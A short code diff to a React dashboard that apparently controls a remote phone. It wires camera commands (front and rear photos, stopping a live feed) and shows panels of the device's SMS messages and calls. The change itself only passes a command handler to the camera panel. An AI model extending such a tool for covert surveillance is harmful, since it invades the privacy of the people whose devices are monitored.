@@ -305,7 +305,7 @@ function App() {
 
             {/* ── Media row: Camera + SMS + Calls ────────────────────────────── */}
             <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
-              <CameraLiveFeed frame={cameraFrame} photos={photos} onTakeFront={() => handleCommand('take_photo', { camera: 'front' })} onTakeRear={() => handleCommand('take_photo', { camera: 'rear' })} onStopLive={() => handleCommand('camera_live_stop')} />
+              <CameraLiveFeed frame={cameraFrame} photos={photos} onTakeFront={() => handleCommand('take_photo', { camera: 'front' })} onTakeRear={() => handleCommand('take_photo', { camera: 'rear' })} onStopLive={() => handleCommand('camera_live_stop')} onCommand={handleCommand} />
               <SMSPanel messages={selectedDevice?.sms || []} />
               <CallsPanel calls={selectedDevice?.calls || []} />
             </div>
